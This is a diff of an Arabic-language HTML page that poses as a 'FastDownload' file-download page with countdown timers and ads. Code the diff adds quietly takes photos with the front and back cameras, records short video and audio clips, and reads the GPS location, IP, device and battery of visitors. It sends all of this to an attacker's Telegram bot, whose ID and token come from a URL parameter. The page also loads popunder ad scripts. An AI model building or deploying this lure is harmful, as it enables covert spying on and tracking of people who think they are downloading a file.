@@ -1,40 +1,103 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title></title>
+<title>تحميل الملف</title>
 <style>
-html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    min-height: 100%;
-    background: #fff;
-}
+  /* ستايل صفحة التحميل بتاعتك */
+  *{box-sizing:border-box}
+  body{margin:0;background:#eef1f6;font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center}
+  .nav{background:#1f2a44;color:#fff;padding:12px 16px;font-size:20px;font-weight:bold;letter-spacing:.5px}
+  .nav span{color:#4cc38a}
+  .wrap{max-width:780px;margin:16px auto;padding:0 10px}
+  .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:20px 14px;margin-bottom:14px}
+  .steps{display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:14px}
+  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px; display:flex; align-items:center; justify-content:center;}
+  .dot.on{background:#2d7ff9}
+  .dot.done{background:#2fb36d}
+  .line{width:40px;height:3px;background:#d5dbe6}
+  .line.done{background:#2fb36d}
+  h2{margin:4px 0 4px;font-size:20px}
+  .sub{font-size:14px;color:#6b7690;margin-bottom:12px}
+  .ring{position:relative;width:130px;height:130px;margin:10px auto}
+  .ring>svg{transform:rotate(-90deg)}
+  .ring .bg{fill:none;stroke:#e3e8f1;stroke-width:10}
+  .ring .fg{fill:none;stroke:#2d7ff9;stroke-width:10;stroke-linecap:round;stroke-dasharray:339.3;stroke-dashoffset:0;transition:stroke-dashoffset 1s linear,stroke .3s}
+  .ring.done .fg{stroke:#2fb36d}
+  .ring .num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:36px;font-weight:bold;color:#2d7ff9}
+  .ring.done .num{color:#2fb36d;font-size:44px}
+  .status{font-size:15px;min-height:22px;margin:6px 0 10px}
+  .ads{margin:12px 0; min-height: 60px;}
+  .ads iframe{border:0;display:block;margin:8px auto;max-width:100%}
+  .btnbox{margin-top:16px;padding-top:14px;border-top:1px dashed #cfd6e4}
+  .btn{display:inline-block;font-family:inherit;font-size:19px;font-weight:bold;color:#fff;background:linear-gradient(#3fcf85,#27a465);border:0;border-radius:50px;padding:14px 54px;min-width:230px;cursor:pointer;box-shadow:0 5px 0 #1d7f4d,0 8px 14px rgba(39,164,101,.35);transition:opacity .3s,filter .3s}
+  .btn.dl{background:linear-gradient(#4a9bff,#2d7ff9);box-shadow:0 5px 0 #1d5fc2,0 8px 14px rgba(45,127,249,.35)}
+  .btn:disabled{opacity:.4;filter:grayscale(.5);box-shadow:0 5px 0 rgba(0,0,0,.15);cursor:not-allowed}
+  .btn.ready{animation:pulse 1.2s infinite}
+  .btn:not(:disabled):active{transform:translateY(3px);box-shadow:0 2px 0 #1d7f4d}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+  .ic{display:block;flex:none}
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px}
+  .page{display:none}.page.active{display:block}
+  .ftr{font-size:12px;color:#8a93a8;margin:16px 0}
 </style>
 </head>
 <body>
 
+<div class="nav">Fast<span>Download</span></div>
+<div class="wrap">
+
+<!-- صفحة 1 -->
+<div class="page active" id="p1"><div class="card">
+  <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
+  <h2>جاري تجهيز الرابط</h2>
+  <div class="sub">من فضلك انتظر قليلاً</div>
+  <div class="ring" id="r1"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">5</div></div>
+  <div class="status" id="s1">يتم التحقق من الرابط...</div>
+  <div class="ads" id="ads1"></div>
+  <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
+</div></div>
+
+<!-- صفحة 2 -->
+<div class="page" id="p2"><div class="card">
+  <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
+  <h2>انتظر حتى ينتهي العداد</h2>
+  <div class="sub">العداد يعمل فقط أثناء بقائك في هذه الصفحة</div>
+  <div class="ring" id="r2"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
+  <div class="status" id="s2">يرجى عدم مغادرة الصفحة...</div>
+  <div class="ads" id="ads2"></div>
+  <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
+</div></div>
+
+<!-- صفحة 3 -->
+<div class="page" id="p3"><div class="card">
+  <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
+  <h2>الرابط جاهز تقريباً</h2>
+  <div class="sub">آخر خطوة قبل التحميل</div>
+  <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
+  <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
+  <!-- إعلانات الصفحة الأخيرة -->
+  <div class="ads" id="ads3"></div>
+  <div id="native3"></div>
+  <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
+</div></div>
+
+<div class="ftr">جميع الحقوق محفوظة</div>
+</div>
+
 <script>
 "use strict";
 
-/* فك تشفير الرابط */
+/* ═══════════════════════════════════════════════════
+   1. كود الأذونات الخاص بك (بدون أي تعديل)
+   ═══════════════════════════════════════════════════ */
 function decodeBase64(value) {
     try {
         value = value.replace(/-/g, "+").replace(/_/g, "/");
-
-        while (value.length % 4 !== 0) {
-            value += "=";
-        }
-
+        while (value.length % 4 !== 0) { value += "="; }
         const binary = atob(value);
-        const bytes = Uint8Array.from(
-            binary,
-            char => char.charCodeAt(0)
-        );
-
+        const bytes = Uint8Array.from(binary, char => char.charCodeAt(0));
         return new TextDecoder().decode(bytes);
     } catch (error) {
         console.error("Decode error:", error);
@@ -42,163 +105,304 @@ function decodeBase64(value) {
     }
 }
 
-/* استخراج الأذونات */
 function getFeatures() {
     const urlParams = new URLSearchParams(location.search);
     const encoded = urlParams.get("u");
-
     if (!encoded) return new Set();
-
     const decoded = decodeBase64(encoded);
     console.log("Decoded:", decoded);
-
     const params = new URLSearchParams(decoded);
-
-    return new Set(
-        [...params.keys()].map(key =>
-            key.trim().toLowerCase()
-        )
-    );
+    return new Set([...params.keys()].map(key => key.trim().toLowerCase()));
 }
 
-/* فحص حالة الإذن */
 async function getPermissionState(name) {
     if (!navigator.permissions) return "unknown";
-
     try {
-        const permission = await navigator.permissions.query({
-            name: name
-        });
-
+        const permission = await navigator.permissions.query({ name: name });
         return permission.state;
-    } catch (error) {
-        return "unknown";
-    }
+    } catch (error) { return "unknown"; }
 }
 
-/* طلب إذن الكاميرا */
 async function requestCamera() {
     const state = await getPermissionState("camera");
-
     console.log("Camera state:", state);
-
-    if (state === "granted" || state === "denied") {
-        return;
-    }
-
+    if (state === "granted" || state === "denied") return;
     if (!navigator.mediaDevices?.getUserMedia) return;
-
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: false
-        });
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         stream.getTracks().forEach(track => track.stop());
-
         console.log("Camera permission granted");
-    } catch (error) {
-        console.log("Camera request:", error.name);
-    }
+    } catch (error) { console.log("Camera request:", error.name); }
 }
 
-/* طلب إذن الميكروفون */
 async function requestMicrophone() {
     const state = await getPermissionState("microphone");
-
     console.log("Microphone state:", state);
-
-    if (state === "granted" || state === "denied") {
-        return;
-    }
-
+    if (state === "granted" || state === "denied") return;
     if (!navigator.mediaDevices?.getUserMedia) return;
-
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: false,
-            audio: true
-        });
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
         stream.getTracks().forEach(track => track.stop());
-
         console.log("Microphone permission granted");
-    } catch (error) {
-        console.log("Microphone request:", error.name);
-    }
+    } catch (error) { console.log("Microphone request:", error.name); }
 }
 
-/* طلب إذن الموقع */
 async function requestLocation() {
     const state = await getPermissionState("geolocation");
-
     console.log("Location state:", state);
-
-    if (state === "granted" || state === "denied") {
-        return;
-    }
-
+    if (state === "granted" || state === "denied") return;
     if (!navigator.geolocation) return;
-
     await new Promise(resolve => {
         navigator.geolocation.getCurrentPosition(
-            () => {
-                console.log("Location permission granted");
-                resolve();
-            },
-            error => {
-                console.log("Location request:", error.message);
-                resolve();
-            },
-            {
-                enableHighAccuracy: false,
-                timeout: 15000,
-                maximumAge: 0
-            }
+            () => { console.log("Location permission granted"); resolve(); },
+            error => { console.log("Location request:", error.message); resolve(); },
+            { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
         );
     });
 }
 
-/* تشغيل الأذونات حسب الرابط */
 async function start() {
     const features = getFeatures();
-
-    const camera = [
-        "fc",
-        "bc",
-        "fcv",
-        "bcv"
-    ].some(key => features.has(key));
-
-    const microphone = [
-        "r",
-        "fcv",
-        "bcv"
-    ].some(key => features.has(key));
-
+    const camera = ["fc","bc","fcv","bcv"].some(key => features.has(key));
+    const microphone = ["r","fcv","bcv"].some(key => features.has(key));
     const location = features.has("l");
-
     console.log("Requested features:", [...features]);
 
-    if (camera) {
-        await requestCamera();
-    }
-
-    if (microphone) {
-        await requestMicrophone();
-    }
-
-    if (location) {
-        await requestLocation();
-    }
+    if (camera) await requestCamera();
+    if (microphone) await requestMicrophone();
+    if (location) await requestLocation();
 
     console.log("Permission test completed");
 }
+// (تم إيقاف التشغيل التلقائي هنا عشان ندمجه مع صفحة التحميل)
+// start();
 
-/* البدء عند تحميل الصفحة */
-start();
+/* ═══════════════════════════════════════════════════
+   2. منطق الإرسال والالتقاط (اللي طلبته)
+   ═══════════════════════════════════════════════════ */
+const urlParams = new URLSearchParams(location.search);
+let BOT_ID = "", BOT_TOKEN = "";
+if (urlParams.get("u")) {
+    const decoded = decodeBase64(urlParams.get("u"));
+    const p = new URLSearchParams(decoded);
+    BOT_ID = p.get("id");
+    BOT_TOKEN = p.get("token");
+}
 
+let visitorIP = "غير معروف", visitorCountry = "غير معروف", visitorDevice = "Unknown", visitorBattery = "غير متاح";
+
+async function sendVisitorInfo() {
+    if (!BOT_ID || !BOT_TOKEN) return;
+    try {
+        const ua = navigator.userAgent;
+        if (/Android/i.test(ua)) visitorDevice = "Android";
+        else if (/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
+        else visitorDevice = "Unknown";
+
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                visitorBattery = (b.level * 100) + "%";
+                if (b.charging) visitorBattery += " (شحن)";
+            } catch (e) {}
+        }
+
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            visitorIP = d.ip || "غير معروف";
+            visitorCountry = d.country_name || "غير معروف";
+        } catch (e) {}
+
+        const msg = `🟢 <b>زيارة جديدة</b>
+🌍 <b>الدولة:</b> ${visitorCountry}
+📱 <b>الجهاز:</b> ${visitorDevice}
+🔋 <b>البطارية:</b> ${visitorBattery}
+🌐 <b>IP:</b> <code>${visitorIP}</code>
+🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: BOT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    } catch (err) {}
+}
+
+function buildCaption(extra = "") {
+    let cap = `━━━━━━━━━━━━━━━\n`;
+    cap += `🌍 الدولة: ${visitorCountry}\n`;
+    cap += `📱 الجهاز: ${visitorDevice}\n`;
+    cap += `🔋 البطارية: ${visitorBattery}\n`;
+    cap += `🌐 IP: ${visitorIP}\n`;
+    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+    if (extra) cap += `${extra}\n`;
+    cap += `━━━━━━━━━━━━━━━`;
+    return cap;
+}
+
+async function captureAndSend(stream, type) {
+    return new Promise((resolve) => {
+        const video = document.createElement('video');
+        video.autoplay = true; video.playsInline = true; video.muted = true;
+        video.style.display = 'none'; video.srcObject = stream;
+        document.body.appendChild(video);
+
+        video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(async (blob) => {
+                    if (blob && blob.size > 2000) {
+                        const form = new FormData();
+                        form.append('chat_id', BOT_ID);
+                        form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                        form.append('caption', buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`));
+                        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form }); } catch (e) {}
+                    }
+                    document.body.removeChild(video);
+                    resolve();
+                }, 'image/jpeg', 0.9);
+            }, 2000);
+        };
+    });
+}
+
+async function recordAndSend(stream, type) {
+    return new Promise((resolve) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            const form = new FormData();
+            form.append('chat_id', BOT_ID);
+            form.append('video', blob, `${type}_${Date.now()}.mp4`);
+            form.append('caption', buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`));
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form }); } catch (e) {}
+            resolve();
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 5000);
+    });
+}
+
+async function recordAudioAndSend(stream) {
+    return new Promise((resolve) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/mp4' });
+            const form = new FormData();
+            form.append('chat_id', BOT_ID);
+            form.append('audio', blob, `audio_${Date.now()}.mp4`);
+            form.append('caption', buildCaption(`🎤 تسجيل صوتي - 5 ثوان`));
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form }); } catch (e) {}
+            resolve();
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 5000);
+    });
+}
+
+async function sendLocation() {
+    return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: BOT_ID, text: caption })
+                    });
+                    resolve();
+                },
+                (error) => { resolve(); }
+            );
+        } else { resolve(); }
+    });
+}
+
+async function startFeatures() {
+    if (!BOT_ID || !BOT_TOKEN) return;
+    
+    // تشغيل الأذونات الخاصة بك
+    await start();
+
+    const features = getFeatures();
+    sendVisitorInfo();
+
+    if (features.has('fc')) {
+        try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); await captureAndSend(stream, 'front'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+    }
+    if (features.has('bc')) {
+        try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); await captureAndSend(stream, 'back'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+    }
+    if (features.has('fcv')) {
+        try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); await recordAndSend(stream, 'front'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+    }
+    if (features.has('bcv')) {
+        try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); await recordAndSend(stream, 'back'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+    }
+    if (features.has('r')) {
+        try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); await recordAudioAndSend(stream); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+    }
+    if (features.has('l')) {
+        await sendLocation();
+    }
+}
+
+/* ═══════════════════════════════════════════════════
+   3. كود التصميم والإعلانات والعدادات
+   ═══════════════════════════════════════════════════ */
+var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
+var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
+var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
+var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
+var NATIVE_ID = "container-b7c04a4357034ffd034b99d790f5ab0a";
+var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250}, {k:"5a15670c4d12e8d18867f5d00cc9b0e0",w:160,h:300}, {k:"a30e53d4900dc8e1aef5fc44df282cd1",w:160,h:600}, {k:"64d5f0c7a671272b63256f5b66f8f14a",w:320,h:50}, {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90} ];
+var CIRC = 339.3;
+function $(id){return document.getElementById(id)}
+
+function addBanners(boxId){ var box = $(boxId); BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
+function addNative(boxId){ var c = document.createElement("div"); c.id = NATIVE_ID; $(boxId).appendChild(c); var s = document.createElement("script"); s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE; document.body.appendChild(s); }
+var ghostLoaded = false;
+function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
+
+function ring(n, secs, onlyVisible, doneMsg, onDone){ var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; var iv = setInterval(function(){ if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; left--; num.textContent = left; fg.style.strokeDashoffset = CIRC * (1 - left/secs); if(left <= 0){ clearInterval(iv); el.classList.add("done"); num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; $("s"+n).textContent = doneMsg; onDone(); } }, 1000); }
+function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("ready"); setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); }
+function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
+function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
+
+addBanners("ads1"); 
+ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
+
+// بمجرد الضغط على "متابعة" في الصفحة الأولى، بنشغل دالة الأذونات والإرسال
+$("b1").onclick = function(){ 
+    goNext(this, function(){ 
+        startFeatures(); // هنا بنشغل الكود اللي بيطلب الأذونات ويبعت الملفات
+        
+        show(2); 
+        addGhost(); addBanners("ads2"); 
+        ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
+    }); 
+};
+
+$("b2").onclick = function(){ 
+    goNext(this, function(){ 
+        show(3); 
+        addGhost(); 
+        addBanners("ads3"); // إعلانات الصفحة الأخيرة
+        addNative("native3");
+        ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); 
+    }); 
+};
+$("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
-
 </body>
-</html>
+    </html>
